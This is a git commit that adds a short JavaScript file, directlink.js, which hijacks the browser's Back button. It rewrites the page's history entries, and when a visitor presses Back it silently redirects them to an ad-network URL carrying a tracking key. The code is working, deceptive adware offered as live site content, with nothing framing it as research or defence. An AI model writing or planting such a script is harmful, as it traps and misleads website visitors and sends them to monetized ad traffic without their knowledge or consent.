44e4b7d1420c23c8ef32272dfc46cff3aa313f78
hamzah79 <hamzah.pujiningrat@gmail.com>
2023-07-15 10:55:26 +0700

    Create directlink.js

---
+++ directlink.js
@@ -0,0 +1,12 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+&quot;#!/history&quot;);
+history.pushState(null, document.title, location.pathname);
+window.addEventListener(&quot;popstate&quot;, function() {
+if(location.hash === &quot;#!/history&quot;) {
+history.replaceState(null, document.title, location.pathname);
+setTimeout(function(){
+location.replace(&quot;https://www.highwaycpmrevenue.com/nhe9bx3h?key=a0b1104cf5dbc0d990c207a6ba57f58c&quot;);
+},10);
+}
+}, false);
+}(window, location));
